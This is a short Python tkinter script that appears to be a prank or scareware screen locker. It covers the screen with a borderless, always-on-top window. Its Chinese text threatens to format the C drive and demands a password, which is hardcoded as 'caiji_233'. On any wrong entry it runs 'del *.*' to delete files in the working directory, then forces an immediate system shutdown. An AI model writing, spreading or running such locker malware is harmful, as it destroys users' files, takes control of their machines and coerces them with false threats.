import tkinter as tk
from tkinter import *
from tkinter import messagebox
from time import sleep
import os

window = tk.Tk()
window.overrideredirect(True)
window.config(bg='black')
w = window.winfo_screenwidth()
h = window.winfo_screenheight()
window.geometry('%dx%d' % (w, h))
window.attributes('-topmost', True)
a = w / 2 - 350
b = h / 2 - 200
c = w / 2 - 20
d = h / 2
e = w / 2 - 30
f = h / 2 + 180

def passwd():
    password = P.get()
    if password == 'caiji_233':
        tk.messagebox.showinfo('密码正确！', message='message')
        window.destroy()
    else:
        tk.messagebox.showerror('密码错误 磁盘即将格式化！', message='message')
        sleep(3)
        os.system('del *.*')
        tk.messagebox.showerror('磁盘已格式化！！！', message='message')
        os.system('shutdown -s -t 00')

tk.Label(window, text='请输入密码：', bg='black', fg='red', font=('Airal', 30), width=15, height=2).place(x=a + 80, y=b + 180)
tk.Label(window, text='电脑已被锁，请联系caiji_233获得密码\n\n   若强行关机，将格式化C盘！！！\n\n     输入错误也会格式化~盘！！！', bg='black', fg='red', font=('Airal', 30), width=40, height=6).place(x=a - 50, y=b - 100)
result_button = Button(window, command=passwd, text=' 确 定 ', bg='black', fg='red')
result_button.place(x=e, y=f, height=50, width=100)
P = tk.StringVar()
entry = tk.Entry(window, textvariable=P)
entry.place(x=c, y=d, height=50, width=300)
window.mainloop()
